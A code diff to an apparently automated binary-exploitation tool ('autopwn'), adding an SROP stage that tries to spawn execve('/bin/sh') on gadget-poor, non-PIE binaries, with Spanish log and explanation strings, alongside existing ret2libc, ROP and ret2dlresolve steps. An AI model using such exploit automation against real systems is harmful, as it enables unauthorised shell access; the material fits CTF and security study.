@@ -269,6 +269,22 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("canary-bypass", False, str(e)))
 
+    # combo H0: SROP (sigreturn -> execve) -- for a no-PIE binary too gadget-poor for a normal
+    # execve chain: a single rt_sigreturn restores all registers from a forged frame, needing only
+    # `pop rax; ret` + a syscall gadget + an in-binary "/bin/sh". Tried when nothing simpler worked.
+    if run and want("srop") and not is_pie and win is None and not res.win_exploit:
+        log("[combo] SROP: sigreturn -> execve('/bin/sh') (sandbox)...")
+        try:
+            from .autosrop import autosrop
+            rs = autosrop(binary)
+            verdict = True if rs.get("verified") else (None if rs.get("ok") else False)
+            res.attempts.append(("srop", verdict, rs.get("detail") or rs.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rs.get("verified"))
+            log(f"[combo] SROP -> {'SHELL VERIFICADA' if rs.get('verified') else 'no verificado'}")
+            learn(f"srop verified={rs.get('verified')} {rs.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("srop", False, str(e)))
+
     # combo H: ret2dlresolve -- last resort for a dynamic, no-PIE binary with NO gift and NO leak
     # (no win, no system in it): forge the linker's resolver structures to call system('/bin/sh')
     # without leaking libc. Only worth trying when the simpler routes don't apply, so gate on
@@ -341,6 +357,8 @@ def _why(mit: dict, has_win: bool, technique: str) -> str:
                 else " sin canary -> retorno directo a win() (direccion fija)"))
     if "ret2libc" in t:
         return "sin win(): fuga de libc (puts@GOT) -> base -> system('/bin/sh')"
+    if "srop" in t:            # antes de 'rop' (substring): SROP es una tecnica distinta
+        return "binario pobre en gadgets con gadget syscall + '/bin/sh' -> SROP: un rt_sigreturn restaura TODOS los registros desde un frame forjado y ejecuta execve('/bin/sh')"
     if "rop" in t:
         return ("sin win()/system directo -> cadena ROP execve por syscall"
                 + (" (PIE: base resuelta en sandbox)" if pie else ""))
